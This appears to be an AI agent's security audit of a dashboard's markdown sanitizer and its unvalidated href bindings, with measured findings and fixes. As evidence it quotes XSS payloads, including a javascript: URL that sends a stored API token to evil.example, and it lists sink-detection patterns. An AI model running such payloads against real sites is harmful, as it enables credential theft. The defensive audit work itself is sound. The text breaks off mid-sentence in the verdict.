# audit-195-r9 — independent security audit, #195 round 9

**Tree:** `/workspace`, branch `markdown-sanitize-r9`, commit
`13680c2b7d7fd64841573894e5bb1224924eefdd`. Verified with `git rev-parse`.
Tree clean before and after every experiment; `git diff --quiet` asserted at the end.

**Axis assigned:** not "is the guard correct" — *what does this prevent in production.*

Claims are tagged `[MEASURED]` (I ran it, this session, this tree),
`[MEASURED — confirming a claim the brief/dev report asserted]`, or `[NOT MEASURED]`.
Where I confirm somebody else's claim I say whose it is and show my own measurement,
per the brief's instruction.

**Verdict: REQUEST CHANGES.** Nothing in *this diff* is unsafe — round 9 is test code
plus two corrected comments, and I failed to falsify that. What blocks is the
workstream's premise: two live sinks reach the DOM with attacker-controlled data and
no validation at all, the guard cannot see them, and no automated or documented path
in this repository ever runs the guard. Details, and exactly what would clear it, in
§Verdict.

---

## 0. Baseline reproduced

| gate | brief said | I measured | agree |
|---|---|---|---|
| `npm test` | exit 0, 79 checks / 127 assertions | exit 0, **79 checks passed (127 assertions)** | yes |
| files changed `3f6a695..13680c2` | 3 files, `markdown.ts` comment-only | 3 files; `markdown.ts` +27/-… | yes |
| `markdown.ts` comment-only | verified at line granularity | **md5 of the comment-stripped file identical at both revs** (`8339b6e0…`, 22 executable lines each) | yes — stronger oracle, same answer |
| CI | none | `.github/` contains only `ISSUE_TEMPLATE/` and `PULL_REQUEST_TEMPLATE.md`; **0** workflow files; **0** non-sample git hooks | yes, and see F1 — the brief *under*-states it |

All `[MEASURED]`. Exit codes taken from the child process (`subprocess.run` /
`$?` on the direct invocation), never through a pipe.

---

## 1. Trust boundary — established BEFORE any severity is assigned

The brief requires this, and it is what sets every rating below.

**Who writes the markdown** `[MEASURED]`:

- `internal/platform/github/github.go:163` — `Description: issue.GetBody()`
- `internal/platform/github/passthrough.go:138` — `Description: string(issue.Body)`
- `internal/platform/github/passthrough.go:688` — comment `Body: string(n.Body)`
- `internal/server/server.go:843` — `AddComment`, `Body: req.GetBody()`, no content check
- `internal/server/export_import.go:725, 833` — collection import, raw from uploaded JSON

GitHub issue and comment bodies are copied **verbatim**. On a mirrored public
repository, **any GitHub user who can comment is the attacker.** That is the lowest
possible bar. The only Go-side check on `description` is a 65 536-rune length cap
(`internal/server/server.go:78-84`); comment bodies have `NotEmpty()` and nothing else.

**Blast radius of execution in the dashboard origin** `[MEASURED]`:

- Web assets and the gRPC-web API are served from **one mux, one port, one origin**
  (`internal/serverapp/unified.go:97-99`).
- That origin holds a **long-lived API token in localStorage**:
  `web/src/gen/grpc-client.ts:419`, `localStorage.getItem('farmtable.token')`.
- Authorization is coarse: `internal/server/scopes.go:83`, `if len(scopes) == 0 { return nil }`
  — empty scopes is a wildcard. There is no per-object or per-author check on
  `UpdateTask` or on comments.
- Default bind is `:PORT` i.e. **0.0.0.0** (`internal/cli/dashboard.go:124`), while the
  CLI prints `http://localhost:%d`.
- gRPC-web CORS accepts every origin (`internal/serverapp/unified.go:46-48`,
  `WithOriginFunc(func(origin string) bool { return true })`).
- There is **no Content-Security-Policy** anywhere — no meta tag in
  `web/index.html`, no Go handler setting the header `[MEASURED]`.

**Therefore:** script execution in the dashboard origin is not a defacement. It is
theft of a long-lived credential that grants write access to every task in every
collection. Any finding on this workstream that reaches script execution is
**Critical**. Anything that only reaches *navigation* or *content spoofing* in that
origin is High.

I verified the Go citations above myself rather than relaying them.

---

## 2. FINDINGS

### [HIGH] F1 — The control is a test, and no automated *or documented* path in this repository runs it

**Location:** `Makefile:9-10`, `Makefile:16-17`, `web/package.json:8-9`,
`.github/` (no workflows), `CLAUDE.md:31-36`, `README.md:95`, `docs/architecture.md:458`

The brief asked me to state the enforcement story plainly and not soften it. Here it is,
and it is worse than the brief's own framing.

`[MEASURED]`

```
.github/workflows          — does not exist. 0 files.
.git/hooks (non-sample)    — 0 files.
Makefile:9   test:            go test ./...              <- does NOT run npm test
Makefile:16  web:             cd web && npm ci && npm run build
Makefile:22  dashboard: web   go build -o bin/ft ./cmd/ft && ./bin/ft dashboard
web/package.json  build:      tsc --noEmit && vite build  <- no test
CLAUDE.md / README.md / docs/architecture.md  document `go test ./...` only.
```

The brief says "there is no CI — nothing in this suite runs automatically on push."
Correct, and an under-claim. **The release path does not run it either.**
`make dashboard` → `make web` → `npm ci && npm run build` → `go build` → the dashboard
is compiled and the assets embedded (`assets.go`, `//go:embed all:web/dist`), and
`markdown.test.ts` was never executed. `make test` runs the Go suite and stops.

So the enforcement story is: **4,610 lines of guard, 79 checks, 127 assertions, nine
rounds of engineering — invoked only when a human types `cd web && npm test`, a command
that appears in no Makefile target, no CI file, no hook, and no document in the repo.**

Compounding it: `web/dist` is gitignored (`.gitignore:17`) but embedded by `assets.go`.
The guard reads `web/src/`; the shipped binary carries `web/dist/`. The one assertion in
the suite designed to catch source/artifact divergence — `renderMarkdown.length === 1`,
whose value `markdown.ts:183-190` argues for at length — also only runs under
`npm test`, so it cannot catch a stale `dist` in any path that would actually ship one.

- **Impact:** every finding the guard *does* catch is caught only by voluntary action.
  The round-9 `privateDOMPurifyInstance()` pin is the sharpest illustration: the dev
  report records `[MEASURED-BY-dev]` that the reverted tree still passes `tsc` and
  `npm run build` — i.e. the *only* gate that catches full script execution is the one
  gate no automated path invokes. I did not re-run their J1 revert; I do not need to,
  because I measured the enforcement side directly and that is the half that matters here.
- **Exploit path:** not an exploit — a process gap. A hostile or merely careless change
  reaches `main` and then a built binary without the guard ever running.
- **Who owns it:** the repository maintainer / the manager agent who owns build and
  release config. Not the developer on #195, and not a decision this audit can defer to
  "somebody else" — it is the finding that decides whether the other nine rounds bought
  anything.
- **Recommendation:**

  ```makefile
  # Makefile
  test:
  	go test ./...
  	cd web && npm ci && npm test

  web:
  	cd web && npm ci && npm test && npm run build
  ```

  and a workflow that runs on push and pull_request:

  ```yaml
  # .github/workflows/ci.yml
  name: ci
  on: [push, pull_request]
  jobs:
    go:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v4
        - uses: actions/setup-go@v5
          with: { go-version-file: go.mod }
        - run: go test ./...
    web:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v4
        - uses: actions/setup-node@v4
          with: { node-version: '20', cache: npm, cache-dependency-path: web/package-lock.json }
        - run: npm ci
          working-directory: web
        - run: npm test          # the sanitizer guard
          working-directory: web
        - run: npm run build
          working-directory: web
  ```

  Until `npm test` sits on the release path, this workstream's residual risk is carried
  by human memory.

---

### [HIGH] F2 — Two live `href` bindings take attacker-controlled data with no validation anywhere in the stack, and the guard cannot see them

**Location:** `web/src/components/inspector/ft-inspector-meta.ts:611` (`href=${t.remoteUrl}`),
`web/src/components/inspector/ft-inspector-code.ts:106` (`href=${pr.url}`)

This is the brief's §1 question — "is there any other sink that bypasses
`renderMarkdown` entirely?" — and the answer is yes, two of them, in production today.

**Measured, end to end:**

1. **Lit does not sanitize attribute bindings.** I rendered the exact template from
   `ft-inspector-meta.ts:611` under JSDOM `[MEASURED]`:

   ```
   rendered href attribute : "javascript:fetch(\"https://evil.example/?t=\"+localStorage.getItem(\"farmtable.token\"))"
   target                  : "_blank"
   verbatim?               : true
   no-target href verbatim?: true
   setSanitizer configured : false
   ```

   No `setSanitizer` / `sanitizerFactory` / Trusted Types anywhere in `web/src`.

2. **Nothing validates it on the way in.** `proto/farmtable.proto:343` and `:265` carry
   `(buf.validate.field).string.uri = true` — but **protovalidate is never instantiated**
   `[MEASURED]`: the only occurrence of the string in the whole Go tree is the blank
   descriptor import at `api/farmtable/v1/farmtable.pb.go:16`. There is no validating
   interceptor. The annotations are decoration. `internal/server/server.go:654-661` writes
   `p.RemoteData["remote_url"] = req.GetRemoteUrl()` raw; `export_import.go:739` imports
   the whole `RemoteData` map raw from uploaded JSON.

   Separately: even if it *were* enforced, `javascript:alert(1)` is a syntactically valid
   absolute URI and would pass a `string.uri` rule. A scheme allowlist is the control, not
   a URI-syntax rule.

3. **The guard is blind to it.** Content-addressed mutation harness
   (`/tmp/r9audit/mutate.py`: aborts unless the tree is clean and each anchor occurs
   exactly once, exit codes from `subprocess.run`, restores in `finally`, re-asserts clean):

   | id | mutation | prediction | measured |
   |---|---|---|---|
   | M1 | `<a href=${this.description}>` planted in a **REQUIRED_SINKS** file | GREEN | **GREEN 79/127, tsc 0** |
   | M3 | `<a href=${this.heading}>` planted in a **non-sink** component | GREEN | **GREEN 79/127, tsc 0** |
   | M2 | **positive control, different axis:** `.innerHTML =` in the *same* non-sink component | RED | **RED, 1 of 79**, `tripwire: no listed raw-HTML sink … src/components/ft-empty-state.ts (innerHTML/outerHTML assignment)` |
   | M4 | `new DOMParser().parseFromString(...)` + `adoptNode` in a non-sink component | GREEN | **GREEN 79/127, tsc 0** |

   4 of 4 predictions correct. M2 is the control that makes M1/M3/M4 evidence rather than
   a broken harness: it is the same file, the same harness, the same suite, and it goes
   RED with correct per-rule attribution. `BANNED_SINKS`
   (`web/src/util/markdown.test.ts:2462-2479`) has eight patterns and **not one of them is
   about a URL-bearing attribute**.

**Is it exploitable today?** Two parts, and I am separating them because one I measured
and one I did not.

- **Measured and live:** an arbitrary attacker URL renders under the trusted label
  "Open External Source" inside the dashboard's own chrome. That is credential phishing
  with a first-party affordance — the *exact* threat `markdown.ts:4-10` cites as the
  reason to forbid `<form>`. The markdown path forbids the phishing form; the href path
  hands out the phishing link. That inconsistency is the finding.
- **NOT measured:** whether `javascript:` executes. Both anchors carry
  `target="_blank"`, and modern engines block `javascript:` navigation into a new
  browsing context. **I could not run a real browser engine in this environment — JSDOM
  implements no navigation — so I am not asserting execution, and this finding does not
  depend on it.** What I *am* asserting is that `target="_blank"` is an *incidental*
  mitigation: it is there for tabnabbing, nothing pins it, and M1/M3 show that adding or
  editing such a binding is invisible to all 79 checks. This is precisely the argument
  `markdown.ts:40-48` makes for forbidding `slot` — "an invariant of the surrounding
  template's nesting, not of this sanitizer." The same reasoning applied to `slot` at zero
  cost has not been applied here, where the cost is also zero.

  If `target="_blank"` is ever dropped from either anchor, this becomes **Critical** under
  §1's blast radius, with a green suite.

**Recommendation.** The repository already contains the right pattern — apply it.
`web/src/components/ft-toolbar.ts:460-465` validates `remoteId` against
`GITHUB_REPO_RE` and builds the URL from a literal prefix. For the two unvalidated sinks,
a shared helper plus a server-side scheme allowlist:

```ts
// web/src/util/url.ts
const SAFE_SCHEMES = new Set(['http:', 'https:', 'mailto:']);
/** Returns the URL only if it is safe to place in an href; otherwise undefined. */
export function safeExternalHref(raw: string | undefined): string | undefined {
  if (typeof raw !== 'string' || raw === '') return undefined;
  let u: URL;
  try { u = new URL(raw, window.location.origin); } catch { return undefined; }
  return SAFE_SCHEMES.has(u.protocol) ? u.href : undefined;
}
```

```ts
// ft-inspector-meta.ts:611  and  ft-inspector-code.ts:106
${safeExternalHref(t.remoteUrl)
  ? html`<a href=${safeExternalHref(t.remoteUrl)} target="_blank" rel="noopener noreferrer">…</a>`
  : html`<span class="external-source-plain">${t.remoteUrl}</span>`}
```

```go
// internal/server/server.go, applied in UpdateTask before line 660
func validateExternalURL(raw string) error {
    if raw == "" { return nil }
    u, err := url.Parse(raw)
    if err != nil { return status.Error(codes.InvalidArgument, "remote_url is not a valid URL") }
    switch u.Scheme {
    case "http", "https":
        return nil
    default:
        return status.Errorf(codes.InvalidArgument, "remote_url scheme %q is not allowed", u.Scheme)
    }
}
```

Apply the same to every `PullRequest.url` on the write path
(`internal/server/server.go:645-651`) and on import (`export_import.go:738-739`).

**And add the rule to the guard**, so the class is closed rather than the instance —
this file's own repeated lesson:

```ts
// markdown.test.ts, alongside BANNED_SINKS
const URL_ATTR_BINDINGS = [
  { name: 'dynamic href binding', pattern: /\bhref\s*=\s*\$\{/ },
  { name: 'dynamic src binding',  pattern: /\bsrc\s*=\s*\$\{/  },
];
// tree-wide, allow-listing only call sites that go through safeExternalHref(...)
```

---

### [MEDIUM] F3 — The sanitizer policy is a deny-list: 214 tags and 361 attributes permitted against a measured need of 27 and 6

**Location:** `web/src/util/markdown.ts:26-28` (`FORBID_TAGS`), `:49` (`FORBID_ATTR`),
`:220-223` (the `sanitize` call)

Re-rated with fresh eyes as the brief instructs. I am not bound by the earlier rating and
I did not read it before measuring.

`[MEASURED]` — DOMPurify 3.4.12's own defaults, counted out of
`node_modules/dompurify/dist/purify.cjs.js`:

| default allow-list | count |
|---|---|
| html tags | 119 |
| svg tags | 47 |
| svgFilters | 25 |
| mathMl tags | 30 |
| **tags total** | **222** |
| html attrs 118 + svg 190 + mathMl 54 + xml 5 | **367** |

`markdown.ts` subtracts 8 tags and 6 attributes. **Effective policy: 214 tags,
361 attributes.**

`[MEASURED]` — what markdown actually emits, over a nine-document corpus covering the
full CommonMark + GFM feature set (headings, emphasis, strikethrough, code, links,
images, lists, task lists, blockquotes, rules, fenced and indented code, tables with
alignment, hard breaks, footnotes, autolinks):

```
tags  (27): a blockquote br code del em h1..h6 hr img li ol p pre span
            strong table tbody td th thead tr ul
attrs  (6): align alt aria-label href role src
```

**So the policy permits ~8× the tags and ~60× the attributes the feature needs.**

What actually got through, from a 35-payload hostile corpus `[MEASURED]`:

```
14 distinct non-markdown tags survived:
  animatetransform audio circle details div marquee math mi rect
  summary svg template text video
```

Why this is Medium and not High: **0 script-execution primitives survived** — see
§Positive Observations; the deny-list is well-curated, every entry is pinned, and I could
not turn any of the 14 survivors into execution.

Why this is not Low:

1. The *baseline* of this policy is a third-party list that this project does not own.
   `web/package.json:17` declares `"dompurify": "^3.4.12"` — a caret range. The
   `package-lock.json` is committed and `Makefile:17` uses `npm ci`, which pins it today
   `[MEASURED]`. But any `npm install`, any dependabot bump, any lockfile refresh inside
   `^3` can add a tag or attribute to that 222/367 baseline, and **nothing in the 79
   checks asserts "nothing outside the markdown vocabulary survives."** The suite pins
   named payloads. A newly-allowed construct is by definition not a named payload.
2. With no CI (F1), "silently" means literally unobserved.
3. `<svg>` survives, and SVG is the namespace where the `<style>` hole this round closed
   actually lived. The fix was tag-specific; the namespace remains open.

**The collateral is measurably zero**, which is the argument that has been missing:

```ts
const ALLOWED_TAGS = [
  'p','br','hr','h1','h2','h3','h4','h5','h6','ul','ol','li','a','img','code','pre',
  'em','strong','del','blockquote','table','thead','tbody','tr','th','td','span',
];
const ALLOWED_ATTR = ['href','src','alt','title','align','role','aria-label'];

export function renderMarkdown(md: string): string {
  if (typeof md !== 'string') return '';
  return purifier.sanitize(parser.parse(md) as string, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    // Keep the deny-list too. It is not redundant: it documents WHY each of these is
    // refused, and it is the thing that fails loudly if someone widens the allow-list.
    FORBID_TAGS,
    FORBID_ATTR,
  });
}
```

That list is the measured output vocabulary plus `title` (marked emits it for
`[t](url "title")`, which my corpus reached via the image-title payload). Keep both
lists: the deny-list stops being the policy and becomes an assertion about it.

Add the pin the suite does not have:

```ts
check('no tag outside the markdown vocabulary survives', () => {
  const seen = new Set<string>();
  for (const payload of [...XSS_PAYLOADS, ...MARKDOWN_CORPUS]) {
    for (const el of parseFragment(renderMarkdown(payload)).querySelectorAll('*')) {
      seen.add(el.tagName.toLowerCase());
    }
  }
  const extra = [...seen].filter((t) => !ALLOWED_TAGS.includes(t));
  if (extra.length > 0) throw new Error(`tags outside the vocabulary survived: ${extra.join(', ')}`);
});
```

This is the check that would catch a DOMPurify default-list change. Today, nothing would.

---

### [MEDIUM] F4 — `BANNED_SINKS` is a closed enumeration; a raw-HTML sink outside it is invisible

**Location:** `web/src/util/markdown.test.ts:2462-2479`

`[MEASURED]` — M4 above: `new DOMParser().parseFromString(this.heading, 'text/html')`
followed by `adoptNode` + `appendChild` in a non-sink component is **GREEN at 79/127**,
`tsc` 0. The positive control M2 (`.innerHTML =`, same file, same harness) is RED. So this
is a real gap in the list, not a broken probe.

I want to acknowledge that the tree is honest about this: the failure message itself says
`[tripwire: an enumeration of known sinks, not a proof of absence]`, and the docblock says
the rules "are not a proof that no other form exists." That is exactly the right posture.
The finding is that the enumeration is missing forms that are one autocomplete away.

**Recommendation** — add, and give each one a `BANNED_SINK_POSITIVES` fixture so the new
patterns are not untested detection logic (the defect this file already diagnosed once at
`markdown.test.ts:356-365`):

```ts
{ name: 'DOMParser.parseFromString',   pattern: /parseFromString\s*\(/ },
{ name: 'Document.parseHTMLUnsafe',    pattern: /parseHTMLUnsafe\s*\(/ },
{ name: 'Element.setHTML',             pattern: /\.setHTML\s*\(/ },
{ name: 'XSLTProcessor',               pattern: /XSLTProcessor\s*\(/ },
{ name: 'dynamic href/src binding',    pattern: /\b(href|src)\s*=\s*\$\{/ },   // see F2
```

The last one is the one that matters — it is the only entry that would have caught
something that is already in the tree.

---

### [MEDIUM] F5 — No Content-Security-Policy on an origin that stores a long-lived API token

**Location:** `web/index.html` (no CSP meta), `internal/serverapp/unified.go:97-99`
(no header), `web/src/gen/grpc-client.ts:419` (`localStorage.getItem('farmtable.token')`)

`[MEASURED]` — grepped the whole tree for `Content-Security-Policy`: zero occurrences
outside an unrelated test name.

`renderMarkdown` is not one layer of defence. It is **the only** layer. Every finding
above — F2's href, F3's oversized policy, F4's unenumerated sinks, and any future
DOMPurify bypass — is a single point of failure because there is nothing behind it, and
what sits behind it is a credential with write access to every task in every collection
(§1).

A bundled Vite SPA can carry a real policy. Lit and Shoelace need inline *styles*, not
inline scripts:

```go
// internal/serverapp/unified.go — wrap the asset handler
func securityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Security-Policy",
            "default-src 'self'; "+
            "script-src 'self'; "+
            "style-src 'self' 'unsafe-inline'; "+   // Lit adoptedStyleSheets / Shoelace
            "img-src 'self' data: https:; "+
            "media-src 'none'; "+                   // kills F3's <video>/<audio> survivors
            "object-src 'none'; base-uri 'none'; frame-ancestors 'none'; "+
            "form-action 'none'; connect-src 'self'")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("Referrer-Policy", "no-referrer")
        next.ServeHTTP(w, r)
    })
}
// mux.Handle("/", securityHeaders(http.FileServer(assets)))
```

`script-src 'self'` alone makes every inline-handler and `javascript:` vector in this
whole nine-round workstream non-exploitable. `form-action 'none'` independently kills the
phishing form that `FORBID_TAGS` exists for. This is a ~15-line change that buys more
than rounds 5 through 9 combined, and it is complementary, not a substitute.

---

### [LOW] F6 — Source/artifact divergence has no gate that runs on the artifact path

**Location:** `.gitignore:17`, `assets.go`, `Makefile:16-22`

`web/dist` is gitignored and embedded via `//go:embed all:web/dist`. The guard reads
`web/src/`. `make dashboard` → `make web` builds and embeds without running the guard
(F1). `markdown.ts:183-190` correctly identifies source/artifact divergence as the unique
coverage `renderMarkdown.length === 1` provides — but that assertion lives inside the
suite that the artifact path never invokes, so the coverage it argues for is not actually
obtained in the scenario it was written for. Closing F1 closes this.

---

### [INFORMATIONAL] F7 — Adjacent findings that set the blast radius (out of #195's scope; surfacing, not escalating)

Per my role's composition rules I do not invoke other specialists; these go to the
manager to route. They are here because §1's blast radius depends on them and a rating
cannot be honest without stating them.

| id | location | issue |
|---|---|---|
| F7a | `internal/cli/dashboard.go:81-84` + `internal/server/auth.go:112-114` | `FARMTABLE_OPEN_ACCESS=1` leaves `lookup == nil`, and the interceptor then returns `handler(ctx, req)` before setting `authEnforcedKey` — so `RequireIdentity`, `RequireScope` and `RequireCollectionAccess` all fail open. One env var makes the API world-writable. |
| F7b | `internal/cli/dashboard.go:124` vs `:162` | binds `:PORT` (0.0.0.0) while printing `http://localhost:%d`. The message misrepresents the exposure. |
| F7c | `internal/serverapp/unified.go:46-48` | `WithOriginFunc` and `WithWebsocketOriginFunc` both return `true` unconditionally. Combined with the session cookie's `SameSite: Lax`, a scripted cross-origin credentialed request is not blocked. |
| F7d | `internal/server/scopes.go:83` | `len(scopes) == 0` is treated as wildcard, and `DefaultScopesForUserType`'s `default:` branch returns nil for an unknown user type — so a typo in a user type mints an unrestricted token. |
| F7e | `proto/farmtable.proto` throughout | every `buf.validate` annotation in the file is inert: protovalidate is never instantiated. This is a whole-schema false sense of validation, not just the two URL fields. |

F7e is the one I would raise first — it is a repo-wide belief that a control exists when
it does not.

---

## 3. Round 9's own surface — I tried to falsify "no runtime risk" and failed

Default hypothesis per the brief: round 9 introduced no runtime risk. Attempts to break it:

1. **`markdown.ts` really is comment-only** `[MEASURED]`. Stronger oracle than a diff
   filter: md5 of the file with all `//` and `/* */` comments and blank lines removed is
   `8339b6e052fe6808103bdc6a46dfdb12` at **both** `3f6a695` and `13680c2`, 22 executable
   lines each. I am confirming the brief's claim with my own measurement.

2. **Does the new `templateText: true` blinding hide a hostile construct?** This was the
   brief's §3 hypothesis and the one I most expected to pay out. It did not.

   The blinded view (`markdown.test.ts:1553-1555`, `literalBlindView`) is consumed by
   exactly five scanners, all in the arity/sink path, which read only `markdown.ts` and
   the two `REQUIRED_SINKS` files. My specific hypothesis was that the *indexed*
   `BANNED_SINKS` pattern `/\[['"](inner|outer)HTML['"]\]\s*=/` would be defeated by
   string blanking, since it needs a string literal to match. **Checked: it is not.**
   `markdown.test.ts:3277` builds `code: stripInertText(src, { strings: false })` — strings
   **kept** — and the `BANNED_SINKS` scan at `:3386-3390` runs over that `code`, not over
   `codeNoStrings`. The view choice is correct. `[MEASURED]` — M2's RED confirms the
   `.innerHTML =` arm fires end to end.

3. **`sinkArgumentIsSanitized` and the blanked region.** The trailing-text arm reads the
   ORIGINAL `t` (`markdown.test.ts:2376`, `t.slice(i).trim() === ''`), so
   ``unsafeHTML(renderMarkdown(x) + `<img src=x onerror=alert(1)>`)`` is rejected on
   trailing text; a template-literal argument fails the `^renderMarkdown\s*\(` head. The
   design comment at `:2336-2340` states this explicitly and it holds under reading.
   I found no construct that lives in the blanked region and reaches a sink.

**So: what does round 9's green suite now assert that is not true?** Nothing that I found.
The problem is not a false assertion — it is what 79 green checks *imply* and do not say.
A reader seeing "79 checks passed" concludes the dashboard's markdown path is guarded.
Measured, that green result is worth exactly one thing: a human ran a command. And it is
silent about the two `href` bindings (F2) that reach the same DOM with the same attacker
data through a path the scanner has no rule for.

---

## 4. Positive observations

These are real and I measured them rather than assuming them.

1. **The round-9 private-instance fix is complete, and more complete than the brief
   thinks.** The brief asks whether "anything else in the process can reach or reconfigure
   it," asserting "`setConfig` and `addHook` are process-global by nature." Measured
   `[MEASURED]`:

   ```
   baseline renderMarkdown : "<p><img src=\"x\"></p>\n"
   after singleton setConfig({ADD_TAGS:['script'],ADD_ATTR:['onerror']})
                           : "<p><img src=\"x\"></p>\n"        <- unaffected
     the singleton itself  : "<img src=\"x\" onerror=\"alert(1)\"><script>alert(2)</script>"
   after singleton addHook (afterSanitizeElements, rewrites <p>)
                           : "<p>hello</p>\n"                  <- unaffected
     the singleton itself  : "<p>PWNED</p>"
   after a SECOND private instance's setConfig
                           : "<p><img src=\"x\"></p>\n"        <- unaffected
   module exports          : [ 'renderMarkdown' ]              <- instance not exported
   sanitize shared fn?     : false
   ```

   `setConfig` and `addHook` are **per-instance**, not process-global. `markdown.ts:130`
   genuinely closes the channel, for both config and hooks, against both the singleton and
   any other instance, and the instance is not reachable by name. This is the strongest
   thing round 9 shipped and it is fully load-bearing.

2. **Zero script-execution primitives survive `renderMarkdown`** across a 35-payload
   hostile corpus `[MEASURED]`: `onerror`/`onfocus` stripped, `<script>` and
   `<svg><script>` stripped, `javascript:`/`vbscript:`/`data:text/html` hrefs stripped
   (href removed, element kept), `<iframe srcdoc>` stripped, `<base>` and `<meta refresh>`
   stripped, `<object>`/`<embed>` stripped, SVG `<animate>` retargeting stripped,
   `xlink:href` javascript: stripped, mXSS `<noscript>` payload stripped. My original
   oracle reported 3 survivors; **two of those were my own regex's fault** — `/on[a-z]+=/`
   matches `controls=` inside `<video controls>` — and the third was `onerror=` inert
   inside a `title` attribute value. Corrected oracle: 0. Recording the broken oracle
   because a probe that over-fires is the same defect class as one that under-fires.

3. **The in-tree rationales I could check are true.** I reproduced three of them against a
   raw DOMPurify instance in a scratch process, without touching the tree `[MEASURED]`
   — I am confirming the *developer's* claims with my own measurements:

   | claim (markdown.ts) | ablation | result |
   |---|---|---|
   | `:18-25` `<style>` is stripped in HTML but allowed in SVG | `svg>style` with `style` removed from `FORBID_TAGS` | `<svg><style>@import url("https://evil.example/x.css");*{display:none}</style></svg>` **survives** |
   | same | `<style>` in the HTML namespace, same config | stripped |
   | same, real config | `svg>style`, `FORBID_TAGS` as shipped | `<svg></svg>` |
   | `:12-16` `<dialog>` is an overlay with no style attribute | `dialog` removed from `FORBID_TAGS` | `<dialog open="">overlay</dialog>` survives |
   | `:31-37` `class` is a forgery primitive against component CSS | `class` removed from `FORBID_ATTR` | `<div class="comment-header">x</div>` survives |

   Each entry in those two lists is load-bearing, and the comments explaining why are
   accurate. That is unusual and worth saying.

4. **Dependencies are clean** `[MEASURED]`. `npm audit` → **0 vulnerabilities** across 154
   packages (25 prod). `dompurify@3.4.12`, `marked@15.0.12`, `lit@3.3.2` — current, no
   known-vulnerable configuration. `web/package-lock.json` is committed and tracked, and
   `Makefile:17` uses `npm ci` rather than `npm install`, so the lock is honoured on the
   build path.

5. **`web/src/components/ft-toolbar.ts:460-465` is the correct pattern** — validate the
   opaque identifier against a regex, build the URL from a literal prefix, degrade to a
   non-link badge otherwise. F2's fix is to apply the pattern that is already here.

6. **The guard is honest about its own limits.** `[tripwire: an enumeration of known
   sinks, not a proof of absence]` in the failure message, the `slot` rationale at
   `:40-48` distinguishing a nesting-dependent property from an unconditional one, the
   recorded false claims corrected in place rather than deleted. This is the discipline
   that makes an audit of it possible at all.

---

## 5. Every place this brief was wrong

Required deliverable. Four items, plus two under-claims.

1. **"`setConfig` and `addHook` are process-global by nature."** (§1, first bullet.)
   **FALSE, measured.** Both are per-instance in DOMPurify 3.4.12. `setConfig` and
   `addHook` on the process-global singleton, and `setConfig` on a *second* private
   instance, all leave `renderMarkdown`'s output unchanged (Positive Observation 1, full
   transcript). The premise framed the private instance as still exposed to a global
   channel; it is not. This matters because it is the brief's stated reason to keep
   auditing that surface — the surface is closed.

2. **"There is no CI on this project — nothing in this suite runs automatically on push."**
   (§Baseline.) True but **materially under-stated**, and the under-statement points the
   reader at the wrong fix. The accurate finding (F1) is that **no path in this
   repository runs the guard — not CI, not `make test`, not the release path
   `make web`/`make dashboard`, not any documented command in `CLAUDE.md`, `README.md` or
   `docs/architecture.md`.** "No CI" invites "add CI"; the real answer also requires
   `Makefile:9` and `Makefile:16`. A reader who added only a workflow would still ship
   unguarded artifacts from `make dashboard`.

3. **"The round-9 pin `privateDOMPurifyInstance()` demonstrates it vividly — markdown
   rendered into the Lit dashboard can execute script."** (§1.) The demonstration is real
   but the framing over-claims for the *shipped* tree. In the tree as it stands, script
   execution via `renderMarkdown` requires first reverting `markdown.ts:130`. Measured on
   the tree as shipped: **0 of 35 hostile payloads yield any execution primitive.** The
   live script-execution *risk* on this workstream is not in `renderMarkdown` at all — it
   is at `ft-inspector-meta.ts:611` and `ft-inspector-code.ts:106` (F2), which the brief
   correctly *guessed* at ("is there any other sink that bypasses `renderMarkdown`
   entirely?") but did not connect to the severity discussion.

4. **"A finding's severity here depends on that answer, so establish it before you rate
   anything."** (§2.) Correct instruction, but the brief scopes the trust boundary to
   "task titles, descriptions, comments, labels" — i.e. to markdown fields only. Measured,
   the boundary that actually decides severity is wider in both directions: on the input
   side it includes `remote_url`, `PullRequest.url` and the entire `RemoteData` map via
   collection import; on the output side it includes the fact that the dashboard shares an
   origin with the API and holds `localStorage['farmtable.token']`. Scoping the boundary
   question to markdown fields is what produced nine rounds on `renderMarkdown` and zero
   on the two `href` bindings sitting in the same two component directories.

**Under-claims and things the brief got right, recorded for symmetry:**

- The brief's core instruction — "the guard is a test, state the enforcement story
  plainly" — was the single highest-value direction in the document, and F1 is entirely
  downstream of it.
- "**Enumerating sinks is exactly the kind of closed list that has been incomplete before
  on this workstream**" (§1) — correct, and it paid out twice (F2, F4).
- "**Spend real budget outside this list**" (§4) — correct: F1's Makefile half, F5's CSP,
  F7e's inert protovalidate and the entire trust-boundary trace are outside the brief's
  hypotheses.
- The brief's §3 hypothesis about the `templateText` blanking did **not** pay out. I
  checked it directly (§3, item 2) and the view choices are correct. A green control, and
  I am recording it as a finding rather than a pass: the reason nothing was found is that
  `markdown.test.ts:3277` uses the strings-**kept** view for `BANNED_SINKS`, which is a
  deliberate choice someone made, not an accident. If that line is ever changed to
  `codeNoStrings`, the indexed-`innerHTML` pattern silently stops matching.

**Things I checked in the brief and found correct** (so this list is not just complaints):
the commit and branch; the 79/127 baseline; the three-file change set; the comment-only
character of `markdown.ts` (verified with a stronger oracle); the absence of CI; the
claim that `reports/dev-195-r9.md` and its evidence directory exist and are auditable.

**On the dev report** (`reports/dev-195-r9.md`), which the brief told me to audit rather
than inherit: I did not re-run its mutation matrix — that is the test-review axis, not
mine. The two claims of its that bear on my axis I checked independently and both hold:
`markdown.ts` executable lines are untouched (§3 item 1), and the `createDOMPurify(window)`
change does what it says (Positive Observation 1). Its self-reported eight brief errors
are consistent with what I saw of the tree, and its "what I skipped" section is candid
about C7-p and P10 in a way that made this audit cheaper.

---

## 6. Verdict

### REQUEST CHANGES

**Does anything block merging this diff?** No. Round 9 changes test code and two
comments. `npm test` 0, `tsc --noEmit` 0, `npm run build` 0, tree clean — all reproduced.
The two comment corrections in `markdown.ts` replace measured-false statements with
measured-true ones, which is an improvement. I tried to falsify "round 9 introduced no
runtime risk" and failed.

**Then why REQUEST CHANGES?** Because the deliverable is a security verdict on the
workstream, and the honest summary is:

> Nine rounds have hardened a control that no automated or documented path in this
> repository executes (F1), while two sinks in the same two component directories take
> the same attacker-controlled data straight into the DOM with no validation in Go, no
